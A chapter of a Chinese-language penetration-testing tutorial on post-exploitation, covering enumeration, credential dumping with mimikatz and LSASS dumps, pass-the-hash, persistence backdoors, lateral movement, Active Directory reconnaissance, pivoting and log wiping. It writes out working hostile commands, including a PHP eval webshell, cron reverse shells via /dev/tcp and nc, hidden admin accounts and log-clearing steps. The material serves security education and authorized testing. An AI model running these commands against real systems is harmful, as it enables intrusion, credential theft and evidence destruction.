## 5.1 后渗透是什么？

### 5.1.1 用大白话解释

想象一下你是个小偷（只是比喻，别真去当小偷啊）：

```
前渗透 = 撬开门进去
后渗透 = 进去之后：
  ✓ 找找值钱的东西在哪
  ✓ 看看有没有其他房间的钥匙
  ✓ 做个机关下次能直接进来（留后门）
  ✓ 擦掉指纹和脚印（清日志）
  ✓ 去隔壁邻居家看看（横向移动）
  ✓ ......
```

### 5.1.2 后渗透一般步骤

```
后渗透标准流程：

1. 信息收集（摸清楚这台机器的情况）
2. 权限维持（留后门，下次还能来）
3. 权限提升（还没提权的话继续提）
4. 内网信息收集（看看内网有啥）
5. 横向移动（打其他机器）
6. 拿域控（如果是域环境）
7. 清除痕迹（擦屁股）
8. 写报告（交差）
```

## 5.2 拿到Shell之后先干啥？

### 5.2.1 Windows机器

如果你拿到的是Windows机器的Shell，按这个顺序来：

```bash
# 第一步：看看你是谁，什么权限
whoami
whoami /priv
# 看看是不是SYSTEM，有没有特殊权限

# 第二步：看看这是什么系统
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
# 是Win7还是Win10？32位还是64位？

# 第三步：看看这台机器在不在域里
systeminfo | findstr /B /C:"Domain"
# 或者
echo %USERDOMAIN%
# 如果是WORKGROUP就是工作组，不是域
# 如果是域名那就是域环境

# 第四步：看看有哪些用户
net user
net localgroup administrators
# 看看管理员有谁

# 第五步：看看网络情况
ipconfig /all
# 看看有几个网卡，内网IP是啥
# 域控的IP一般是DNS服务器

netstat -ano
# 看看开了哪些端口，和谁在连接

route print
# 看路由表

# 第六步：抓密码！（最激动人心的一步）
# 这个后面专门讲

# 第七步：看看有什么文件
dir C:\Users\
# 每个用户的桌面、文档里都看看
# 说不定有密码本、敏感文件
```

### 5.2.2 Linux机器

如果是Linux机器：

```bash
# 第一步：你是谁
whoami
id
# 是root还是普通用户？

# 第二步：什么系统
uname -a
cat /etc/issue
cat /etc/*release

# 第三步：有哪些用户
cat /etc/passwd
cat /etc/shadow  # 能看的话就赚了

# 第四步：看看网络
ifconfig  # 或者 ip a
netstat -tulnp
route -n
arp -a

# 第五步：历史命令
cat ~/.bash_history
# 看看之前的人都敲了啥命令
# 说不定有密码！

# 第六步：看看有什么文件
ls -la /root/
ls -la /home/
ls -la /tmp/
find / -name "*.txt" -o -name "*.doc" -o -name "*.pdf" 2>/dev/null
# 找敏感文件

# 第七步：配置文件里找密码
cat /etc/passwd
cat /etc/shadow
find / -name "*.conf" -o -name "*.cfg" -o -name "config.php" 2>/dev/null
# 各种配置文件里可能有密码
```

## 5.3 抓密码哈希——内网渗透的钥匙

在内网里，密码哈希就像通行证一样重要。
拿到哈希之后，可以：
- 破解出明文密码
- 用哈希直接登录其他机器（哈希传递攻击）

### 5.3.1 Windows密码哈希是什么

Windows的密码不是明文存的，是存在SAM文件里的哈希。

```
Windows密码哈希格式：
用户名:RID:LM哈希:NTLM哈希:::

例子：
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                              ↑                              ↑
                           LM哈希                         NTLM哈希
```

- **LM哈希**：老版本的，很弱，很容易破解
- **NTLM哈希**：现在用的，MD4算法

> 💡 **小知识**：Windows Vista及以后，LM哈希默认是禁用的，
> 所以你看到的LM哈希通常是 `aad3b435b51404eeaad3b435b51404ee`，
> 这其实就是空密码的LM哈希。

### 5.3.2 怎么抓哈希

#### 方法1：Meterpreter的hashdump

最简单的方法，前提是你有SYSTEM权限。

```bash
meterpreter > hashdump
# 直接就把所有哈希都打出来了
```

或者用post模块：

```bash
meterpreter > run post/windows/gather/hashdump
```

#### 方法2：用mimikatz（神器！）

mimikatz是Windows密码抓取神器，
功能超级强大，不仅能抓哈希，
还能从内存里抓明文密码！

```bash
# 1. 上传mimikatz到目标机器
# （Kali里有，路径：/usr/share/mimikatz/）

# 2. 执行mimikatz
mimikatz.exe

# 3. 提升权限
privilege::debug
# 显示 "20 OK" 就是成功了

# 4. 抓SAM哈希
lsadump::sam
# 或者
sekurlsa::logonpasswords
# 这个更猛，能从内存里抓明文密码！

# 5. 退出
exit
```

> ⚠️ **注意**：mimikatz很容易被杀软查杀，
> 实战中通常需要做免杀，
> 或者把它注入到其他进程里运行。

#### 方法3：用Procdump转储LSASS

先把LSASS进程的内存dump出来，
然后在本地用mimikatz读，
这样可以避免在目标机器上跑mimikatz被杀。

```bash
# 1. 上传procdump（微软官方工具，一般不会被杀）
# 2. dump LSASS进程
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 3. 把lsass.dmp下载回本地
# 4. 本地用mimikatz读
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords full
```

### 5.3.3 哈希传递（Pass-the-Hash）

抓到哈希之后，就算破解不出来明文，
也可以直接用哈希去登录其他机器！

这就是大名鼎鼎的**哈希传递攻击（PtH）**。

#### 用mimikatz做哈希传递

```bash
# 假设你抓到了管理员的NTLM哈希：
# 31d6cfe0d16ae931b73c59d7e0c089c0

mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:TESTDOMAIN /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0" "exit"

# 执行完之后会弹出来一个cmd窗口，
# 这个cmd窗口就是管理员权限的！
# 然后你就可以用这个cmd去访问其他机器了
# 比如：
# net use \\192.168.1.100\c$
# psexec \\192.168.1.100 cmd
```

#### 用Metasploit做哈希传递

```bash
# 用psexec模块
msf6 > use exploit/windows/smb/psexec

# 设置目标
msf6 exploit(...) > set RHOSTS 192.168.1.100

# 设置用户名和哈希
msf6 exploit(...) > set SMBUser Administrator
msf6 exploit(...) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
# 注意格式：LM哈希:NTLM哈希
# LM哈希不知道就填那个空的aad3b4...

# 设置payload
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.200

# 开打
msf6 exploit(...) > exploit

# 成功的话直接拿到那台机器的Meterpreter
```

> 💡 **哈希传递是内网渗透的核心技能之一**，
> 很多时候内网就是靠这个一路打穿的。

## 5.4 权限维持——留后门

辛辛苦苦打进来，下次还想进来怎么办？
当然是留个后门啦~

### 5.4.1 Windows留后门的方法

#### 方法1：最简单——加个管理员用户

```bash
# 加个用户
net user hack 123456 /add

# 加到管理员组
net localgroup administrators hack /add

# 加到远程桌面用户组（如果有的话）
net localgroup "Remote Desktop Users" hack /add
```

优点：简单粗暴  
缺点：太明显了，一眼就能看出来

#### 方法2：隐藏用户

```bash
# 加个用户名带$的用户（这样net user看不到）
net user hack$ 123456 /add
net localgroup administrators hack$ /add

# 这样用 net user 命令看不到，
# 但在计算机管理里还是能看到
```

#### 方法3：注册表启动项

```bash
# 在注册表里加个启动项，开机自动运行木马
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f

# 这样每次开机都会运行你的木马
# 名字起得像系统服务一样，不容易被发现
```

#### 方法4：计划任务后门

```bash
# 创建一个计划任务，定时运行木马
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\System32\backdoor.exe" /sc minute /mo 5 /ru SYSTEM

# 解释：
# /tn 任务名
# /tr 运行的程序
# /sc minute /mo 5 每5分钟运行一次
# /ru SYSTEM 以SYSTEM权限运行

# 或者设置成开机自启
schtasks /create /tn "WindowsUpdate" /tr "backdoor.exe" /sc onstart /ru SYSTEM
```

#### 方法5：服务后门

```bash
# 创建一个系统服务
sc create "Windows Update Service" binpath= "C:\Windows\System32\backdoor.exe" start= auto type= own

# 启动服务
sc start "Windows Update Service"
```

#### 方法6：Shift粘滞键后门（经典！）

这个是最经典的后门之一，
不用登录系统就能用。

```bash
# 原理：
# 登录界面连按5次Shift会弹出粘滞键（sethc.exe）
# 我们把sethc.exe换成cmd.exe，
# 这样连按5次Shift就能弹出来cmd窗口，
# 而且是SYSTEM权限！

# 替换文件：
copy c:\windows\system32\sethc.exe c:\windows\system32\sethc.exe.bak
copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe

# 然后在登录界面连按5次Shift，
# 就会弹出来cmd，直接就是SYSTEM权限！
```

> ⚠️ **注意**：这个方法很老了，
> 现在很多安全软件都会监控这个文件，
> 但学习了解一下还是有必要的。

类似的还有：
- 放大镜（Magnify.exe）
- 屏幕键盘（osk.exe）
- 讲述人（Narrator.exe）
- 显示切换（DisplaySwitch.exe）

#### 方法7：WebShell后门

如果是Web服务器，
在网站目录深处藏一个一句话木马，
下次直接通过浏览器就能进来。

```php
<?php @eval($_POST['cmd']); ?>
```

优点：隐蔽，方便  
缺点：服务器重启了也还在，但是容易被扫出来

### 5.4.2 Linux留后门的方法

#### 方法1：加root用户

```bash
# 添加一个用户，UID设为0（和root一样）
useradd -o -u 0 -g root hack
echo "hack:123456" | chpasswd

# 或者直接改/etc/passwd
# 找一行改成UID 0的
```

#### 方法2：SSH公钥后门

```bash
# 把你的公钥写到目标机器的~/.ssh/authorized_keys里
echo "你的公钥内容" >> /root/.ssh/authorized_keys

# 然后你就能用密钥直接登录了
ssh root@目标IP
```

优点：隐蔽，方便，稳定  
缺点：需要对方开了SSH密钥登录

#### 方法3：crontab计划任务

```bash
# 编辑root的crontab
crontab -e

# 加一行，每分钟反弹一次Shell
* * * * * /bin/bash -i >& /dev/tcp/你的IP/4444 0>&1

# 或者用nc反弹
* * * * * nc -e /bin/bash 你的IP 4444
```

#### 方法4：SUID后门

```bash
# 复制一份bash，设置SUID
cp /bin/bash /tmp/.bash
chmod u+s /tmp/.bash

# 以后普通用户执行这个就能提权
/tmp/.bash -p
```

#### 方法5：修改PAM（更隐蔽）

这个就比较高级了，
改PAM模块，记录所有密码，
或者留个万能密码。

> 📝 **注意**：留后门是把双刃剑，
> 你能进来，别人也可能利用你的后门进来。
> 正规的渗透测试结束后要把后门都清掉。

## 5.5 内网信息收集——看看内网有啥

拿到一台机器之后，
不要急着打其他机器，
先搞清楚内网的情况。

### 5.5.1 网络结构探测

```bash
# 1. 看本机IP和网段
ipconfig /all    # Windows
ip a             # Linux

# 2. 看有哪些邻居（ARP表）
arp -a

# 3. 看路由表
route print      # Windows
route -n         # Linux

# 4. 看域信息（如果在域里）
net view /domain           # 看有哪些域
net view                   # 看域里有哪些机器
net group "Domain Admins" /domain   # 看域管理员都有谁
net user /domain          # 看所有域用户
net accounts /domain      # 看域密码策略
```

### 5.5.2 扫描内网存活主机

拿到一台内网机器后，
我们就可以从这台机器出发，
扫整个内网了。

#### Windows下扫描

```bash
# 方法1：ping扫描
# 写个简单的批处理
for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.1.%i > nul && @echo 192.168.1.%i is up

# 方法2：用arp扫描
for /L %i in (1,1,254) do @ping -n 1 192.168.1.%i > nul
arp -a

# 方法3：上传扫描工具
# 把nmap、masscan传上去扫
# 但动静比较大，容易被发现
```

#### Linux下扫描

```bash
# 方法1：ping扫描
for i in {1..254}; do (ping -c 1 -W 1 192.168.1.$i > /dev/null && echo "192.168.1.$i is up"); done

# 方法2：用nmap扫
nmap -sn 192.168.1.0/24

# 方法3：arp扫描
arp-scan -l
```

### 5.5.3 端口扫描内网

找到存活主机之后，
再扫扫它们开了哪些端口。

```bash
# 全端口扫某台机器
nmap -p- 192.168.1.100

# 快速扫常用端口
nmap -sV -sT -T4 192.168.1.100
```

> ⚠️ **注意**：内网扫描动静比较大，
> 容易触发IDS/IPS告警，
> 扫的时候慢一点，别太猛。

## 5.6 横向移动——从一台打到一片

横向移动就是从你控制的这台机器，
去攻击内网里的其他机器。

### 5.6.1 常用的横向移动方法

```
常见的横向移动方法：

1. 密码复用 / 哈希传递
   用抓到的密码/哈希去试其他机器
   （很多管理员所有机器用同一个密码）

2. 服务类漏洞
   • SMB（445端口）→ 永恒之蓝、psexec
   • WMI（135端口）→ wmic执行命令
   • WinRM（5985/5986端口）→ WinRS
   • RDP（3389端口）→ 远程桌面
   • SSH（22端口）→ SSH登录

3. 应用漏洞
   • 数据库弱口令（MySQL、MSSQL、Redis...）
   • Web后台弱口令
   • 各种中间件漏洞
```

### 5.6.2 PsExec——最经典的横向移动工具

PsExec是Sysinternals套件里的工具，
可以在远程机器上执行命令。

```bash
# 基本用法：
psexec \\目标IP -u 用户名 -p 密码 cmd.exe

# 例子：
psexec \\192.168.1.100 -u Administrator -p 123456 cmd.exe

# 执行完就会得到目标机器的cmd窗口
```

> 💡 **PsExec的原理**：
> 1. 连接目标的IPC$共享
> 2. 把psexesvc.exe上传过去
> 3. 创建一个服务叫PSEXESVC
> 4. 启动服务，执行命令
> 5. 执行完把服务删掉

缺点：
- 会创建服务，日志比较明显
- 很多安全软件会拦

### 5.6.3 WMI执行命令

WMI（Windows管理规范）也能远程执行命令，
而且更隐蔽一点。

```bash
# 方法1：wmic命令
wmic /node:192.168.1.100 /user:Administrator /password:123456 process call create "cmd.exe /c whoami > C:\result.txt"

# 注意：wmic执行命令不会回显结果，
# 所以要把结果写到文件里，然后再读出来

# 方法2：cscript执行vbs脚本
# 自己写个vbs脚本，用WMI远程执行
```

### 5.6.4 WinRM / WinRS

WinRM（Windows远程管理）也是常用的，
Win10/2012以后默认可能开着。

```bash
# 用winrs执行命令
winrs -r:192.168.1.100 -u:Administrator -p:123456 "whoami"

# 这个是有回显的，方便
```

### 5.6.5 IPC$ 空连接

IPC$（Internet Process Connection）是Windows的共享命名管道，
可以用来建立连接、传输文件、执行命令。

```bash
# 建立IPC$连接
net use \\192.168.1.100\ipc$ "密码" /user:用户名

# 连接成功后可以：
# 1. 查看共享
net view \\192.168.1.100

# 2. 映射磁盘
net use z: \\192.168.1.100\c$
# 然后就可以像访问本地磁盘一样访问对方C盘

# 3. 用at命令创建计划任务执行命令
at \\192.168.1.100 时间 命令

# 4. 上传下载文件
copy 本地文件 \\192.168.1.100\c$\windows\temp\

# 断开连接
net use \\192.168.1.100\ipc$ /del
```

### 5.6.6 哈希传递横向移动

前面讲过了，用抓到的哈希直接去登其他机器。
内网里密码复用的情况很多，
经常一个管理员密码通一片。

## 5.7 域渗透入门

### 5.7.1 什么是域？

很多公司内网用的是域环境（Active Directory，活动目录）。

```
工作组环境：
  每台机器各自为政，
  账号密码存在本地SAM里。

域环境：
  有一台专门的服务器叫域控（DC），
  所有的账号密码都存在域控上，
  用户可以用同一个账号登录域里的任何机器。

域控（DC）是整个域的大脑，
拿到域控就等于拿到了整个域的所有机器！
```

域里的一些基本概念：

| 概念 | 说明 |
|------|------|
| DC（Domain Controller） | 域控制器，存所有用户数据 |
| 域管理员（Domain Admin） | 域的最高权限，能管理所有机器 |
| 域用户 | 域里的普通用户 |
| 域机器 | 加入域的电脑/服务器 |
| OU（组织单元） | 把用户和机器分组管理 |
| SID | 安全标识符，每个用户/组都有唯一的SID |

### 5.7.2 怎么判断是不是域环境

```bash
# 方法1：看环境变量
echo %USERDOMAIN%
# 如果不是WORKGROUP而是个域名，就是域环境

# 方法2：systeminfo
systeminfo | findstr /B /C:"Domain"

# 方法3：看登录用户的前缀
whoami
# 如果是 域名\用户名，就是域用户登录的

# 方法4：看DNS
ipconfig /all
# DNS服务器很可能就是域控
```

### 5.7.3 域渗透的基本思路

```
域渗透流程：

1. 拿下域内一台普通机器
   （Web漏洞、钓鱼、弱口令...）

2. 在这台机器上抓密码/哈希
   → 拿到域用户的密码

3. 用这个域用户的身份去内网逛
   → 找更多机器
   → 抓更多密码

4. 想办法搞到域管理员的密码/哈希
   （哈希传递、社工、钓鱼、漏洞...）

5. 用域管理员身份登录域控
   → 拿到整个域！
```

### 5.7.4 常用的域信息收集命令

```bash
# 看域有哪些用户
net user /domain

# 看域管理员组有哪些人
net group "Domain Admins" /domain

# 看企业管理员组
net group "Enterprise Admins" /domain

# 看域里有哪些机器
net view /domain

# 看有哪些域
net view /domain:域名

# 看域控是谁
net group "Domain Controllers" /domain
# 或者
nltest /DCLIST:域名

# 看当前用户的信息
whoami /all

# 看域的时间（域控的时间）
net time /domain

# 查指定用户的详细信息
net user 用户名 /domain
```

### 5.7.5 PowerView——域信息收集神器

PowerView是PowerSploit里的一个脚本，
专门用来收集域信息，超级好用。

```powershell
# 导入脚本
Import-Module .\PowerView.ps1

# 获取所有域用户
Get-NetUser

# 获取所有域计算机
Get-NetComputer

# 获取所有域管理员
Get-NetGroupMember "Domain Admins"

# 获取域控
Get-NetDomainController

# 获取所有OU
Get-NetOU

# 找登录到某台机器的用户
Get-NetLoggedon -ComputerName 机器名

# 找某用户登录过哪些机器
Find-DomainUserLocation -UserName 用户名

# 找所有本地管理员
Find-LocalAdminAccess
```

### 5.7.6 拿到域管理员的方法

怎么从普通域用户搞到域管理员权限呢？

```
常见方法：

1. 找域管理员登录过的机器
   → 在那台机器上抓哈希
   → 拿到域管的哈希
   → 哈希传递打域控

2. 找有约束委托/无约束委托的机器
   → 利用配置错误提权

3. Kerberoasting攻击
   → 抓服务票据，离线破解
   → 运气好能破解出服务账号密码
   → 服务账号可能权限很高

4. AS-REP Roasting
   → 找不需要预认证的用户
   → 抓AS-REP包，离线破解

5. 域内漏洞
   → Zerologon（CVE-2020-1472）
   → PetitPotam
   → PrinterBug
   → NoPAC
   → ......

6. 社工/钓鱼
   → 给域管发钓鱼邮件
   → 骗到密码
```

域渗透内容非常多，
一章肯定讲不完，
这里只是入门，让大家有个概念。
想深入学习的话可以去专门研究AD渗透。

## 5.8 代理——把你的工具带进内网

很多时候我们需要在本地用工具扫内网，
但我们和内网机器不互通，
这时候就需要搭个代理。

### 5.8.1 什么是代理？

```
你的电脑 ←→ 代理 ←→ 内网机器

代理就是个中转站，
你的流量先到代理机器（你控制的那台），
再由代理机器转发到内网其他机器，
这样你就能直接访问内网了。
```

### 5.8.2 常见的代理方式

#### 1. Meterpreter端口转发

最简单的方法，用Meterpreter的portfwd。

```bash
# 把内网某台机器的3389端口转发到本地
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.100

# -l 本地监听的端口
# -r 目标机器的IP
# -p 目标机器的端口

# 然后你访问本地的3389，就等于访问内网机器的3389了

# 查看转发列表
meterpreter > portfwd list

# 删除转发
meterpreter > portfwd delete -l 3389 -p 3389 -r 192.168.1.100
```

#### 2. Meterpreter路由（socks代理）

端口转发只能一个端口一个端口来，
如果要访问整个网段，
就要加路由，然后搭socks代理。

```bash
# 第一步：加路由
meterpreter > run autoroute -s 192.168.1.0/24
# 把192.168.1.0/24这个网段的流量
# 都通过这个Meterpreter会话转发

# 查看路由表
meterpreter > run autoroute -p

# 第二步：用socks4a代理模块
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(...) > set SRVHOST 127.0.0.1
msf6 auxiliary(...) > set SRVPORT 1080
msf6 auxiliary(...) > set VERSION 4a
msf6 auxiliary(...) > run

# 第三步：本地配置代理
# 浏览器或者其他工具设置socks4a代理
# 地址：127.0.0.1 端口：1080
# 然后就能直接访问内网了！
```

#### 3. EarthWorm / EW

这是个很强大的内网穿透工具，
正向反向都能做。

```bash
# 场景1：目标机器有公网IP（正向）
# 在目标机器上执行：
ew.exe -s ssocksd -l 1080
# 监听1080端口的socks代理

# 然后你本地直接连：
目标IP:1080

# 场景2：目标机器没有公网IP（反向）
# 在你自己的VPS上执行：
ew -s rcsocks -l 1080 -e 8888
# 1080是你本地用的socks端口，8888是给目标连的端口

# 在目标机器上执行：
ew.exe -s rssocks -d 你的VPS_IP -e 8888

# 然后你用本地的127.0.0.1:1080
# 就能访问目标内网了
```

#### 4. FRP

FRP也是个很火的内网穿透工具，
功能很强大，性能也不错。

```
FRP分服务端（frps）和客户端（frpc）。

服务端放你的VPS上，
客户端放目标机器上，
然后就能把目标内网的端口映射到VPS上。
```

代理工具还有很多，
比如：nps、reGeorg、sSocks、lcx...
这里就不一一介绍了，
大家有兴趣可以自己研究。

## 5.9 清除痕迹——擦屁股

干完活要擦屁股，
不然被发现了就不好了。

### 5.9.1 Windows清日志

```bash
# 清除事件日志
# 方法1：用wevtutil
wevtutil cl system      # 清除系统日志
wevtutil cl security    # 清除安全日志
wevtutil cl application # 清除应用程序日志
wevtutil cl "Windows PowerShell"  # 清除PowerShell日志

# 方法2：用eventtriggers（老系统）
eventtriggers 这个现在用得少了

# 方法3：Meterpreter里直接清
meterpreter > clearev
# 这个会清除系统、应用、安全三个日志
```

> ⚠️ **注意**：清日志本身也会触发告警，
> 相当于告诉管理员"我来过，把日志清了"。
> 真正的高手是不怎么清日志的，
> 而是尽量不产生日志，或者伪造日志。

### 5.9.2 Linux清日志

```bash
# 清除登录记录
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog

# 清除历史命令
history -c
history -w
echo > ~/.bash_history
rm -rf ~/.bash_history
ln -s /dev/null ~/.bash_history  # 以后历史命令就写到null里了

# 清空各种日志
echo > /var/log/auth.log
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/apache2/access.log
echo > /var/log/nginx/access.log
# 具体有哪些日志要看系统和服务
```

### 5.9.3 清除文件

```bash
# 你上传的工具、木马要删掉
# 或者用完就放到临时目录，重启自动清

# 删除文件
del /f /q 文件路径    # Windows
rm -rf 文件路径       # Linux

# 更彻底的删除（防恢复）
# Windows用 cipher 或者专门的工具
# Linux用 shred -u 文件
```

> 💡 **提醒**：
> 正规的渗透测试是要留痕的，
> 而且客户授权了，不用清日志。
> 清痕迹那是黑帽子干的事，
> 我们学习了解一下原理就行。
